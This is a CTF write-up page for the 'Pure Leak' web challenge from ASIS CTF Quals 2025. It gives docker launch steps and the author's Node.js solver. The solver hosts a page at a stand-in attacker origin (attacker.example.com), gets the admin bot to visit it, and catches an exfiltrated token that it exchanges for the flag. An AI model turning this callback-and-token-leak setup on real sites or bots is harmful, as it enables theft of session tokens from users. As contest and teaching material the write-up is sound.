---
title: "Pure Leak - ASIS CTF Quals 2025"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "pure", "leak", "web", "asis-ctf-quals-2025"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202509_ASIS_CTF_Quals_2025/web/pure-leak"
license: "none stated"
ctf:
  name: "ASIS CTF Quals 2025"
  year: 2025
  challenge: "Pure Leak"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202509_ASIS_CTF_Quals_2025/web/pure-leak>
- **CTF:** ASIS CTF Quals 2025

---

# [web] pure-leak

## Description

Just leak it!

- Challenge: `http://pure-leak.asisctf.com:3000`
- Admin bot: `http://pure-leak.asisctf.com:1337`

## Attachments

- [pure-leak](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202509_ASIS_CTF_Quals_2025/web/pure-leak/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";
import fs from "node:fs/promises";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const report = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const verify = (token) =>
  fetch(`${BOT_BASE_URL}/api/verify`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ token }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  const html = await fs.readFile("index.html");
  reply.type("text/html; charset=utf-8").send(html);
});

app.post("/debug", (req, reply) => {
  console.log("[DEBUG] " + req.body);
  return "";
});

app.post("/token", async (req, reply) => {
  const token = req.body;
  const flag = await verify(token);
  console.log({ token, flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3 * 1000);
  await report(CONNECTBACK_URL);

  await sleep(5 * 1000);
  assert.fail("Failed");
});
```
